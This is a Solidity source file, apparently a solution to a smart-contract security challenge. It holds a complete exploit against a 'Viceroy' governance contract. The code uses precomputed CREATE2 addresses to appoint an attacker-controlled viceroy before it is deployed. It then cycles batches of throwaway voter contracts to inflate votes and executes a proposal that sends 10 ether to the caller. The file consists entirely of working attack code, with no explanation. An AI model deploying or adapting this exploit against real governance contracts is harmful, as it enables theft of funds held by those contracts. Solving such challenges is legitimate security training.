// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../Viceroy.sol";

contract GovernanceAttacker {
    function attack(Governance governance) public {
        bytes memory proposal = abi.encodeWithSignature("exec(address,bytes,uint256)", msg.sender, "", 10 ether);
        uint256 proposalId = uint256(keccak256(proposal));

        uint nonce = 1;
        address[] memory preCalcedVotersA = getPreCalculatedAddresses(type(VoterAttacker).creationCode, 0, 5);
        address[] memory preCalcedVotersB = getPreCalculatedAddresses(type(VoterAttacker).creationCode, 5, 10);
        address preCalcedViceroy = getViceroyAddress(governance, proposal, preCalcedVotersA);

        // elect viceroy
        governance.appointViceroy(preCalcedViceroy, nonce);

        // deploy viceroy
        ViceroyAttacker viceroy = deployViceroyAttack(governance, proposal, preCalcedVotersA);

        // deploy voter
        deployVoters(0, 5);

        // vote
        for (uint i; i < preCalcedVotersA.length; i++) {
            VoterAttacker(preCalcedVotersA[i]).vote(governance, proposalId, address(viceroy));
        }

        // dissaprove old voters
        viceroy.disapproveVoters();

        // approve new voters
        viceroy.approveNewVoters(preCalcedVotersB);

        // deploy new voter
        deployVoters(5, 10);

        // vote with new voters
        for (uint i; i < preCalcedVotersB.length; i++) {
            VoterAttacker(preCalcedVotersB[i]).vote(governance, proposalId, address(viceroy));
        }

        // execute proposal
        governance.executeProposal(proposalId);
    }

    function deployViceroyAttack(
        Governance governance,
        bytes memory proposal,
        address[] memory voters
    ) internal returns (ViceroyAttacker) {
        uint nonce = 1;
        return new ViceroyAttacker{salt: bytes32(nonce)}(governance, proposal, voters);
    }

    function getViceroyAddress(
        Governance governance,
        bytes memory proposal,
        address[] memory voters
    ) internal view returns (address) {
        uint nonce = 1;
        bytes memory viceroyCreationCode = abi.encodePacked(
            type(ViceroyAttacker).creationCode,
            abi.encode(governance, proposal, voters)
        );
        return getCreate2Address(viceroyCreationCode, nonce);
    }

    function deployVoters(uint startIndex, uint endIndex) internal {
        for (uint i = startIndex; i < endIndex; i++) {
            new VoterAttacker{salt: bytes32(i)}();
        }
    }

    function getPreCalculatedAddresses(
        bytes memory bytecode,
        uint startIndex,
        uint endIndex
    ) internal view returns (address[] memory) {
        address[] memory addresses = new address[](endIndex - startIndex);
        for (uint i = startIndex; i < endIndex; i++) {
            addresses[i - startIndex] = getCreate2Address(bytecode, i);
        }
        return addresses;
    }

    function getCreate2Address(bytes memory contractCreationCode, uint _salt) internal view returns (address) {
        // get a hash concatenating args passed to encodePacked
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff), // 0
                address(this), // address of factory contract
                _salt, // salt
                keccak256(contractCreationCode) // contract creation bytecode of contract to be deployed
            )
        );

        // Cast last 20 bytes of hash to address
        return address(uint160(uint256(hash)));
    }
}

contract ViceroyAttacker {
    Governance governance;
    address[] voters;

    constructor(Governance _governance, bytes memory proposal, address[] memory _voters) {
        governance = _governance;
        voters = _voters;

        governance.createProposal(address(this), proposal);
        for (uint i; i < voters.length; i++) {
            address voter = voters[i];
            governance.approveVoter(voter);
        }
    }

    function disapproveVoters() public {
        for (uint i; i < voters.length; i++) {
            address voter = voters[i];
            governance.disapproveVoter(voter);
        }
    }

    function approveNewVoters(address[] memory _newVoters) public {
        for (uint i; i < _newVoters.length; i++) {
            address voter = _newVoters[i];
            governance.approveVoter(voter);
        }
    }
}

contract VoterAttacker {
    function vote(Governance governance, uint256 proposalId, address viceroy) public {
        governance.voteOnProposal(proposalId, true, viceroy);
    }
}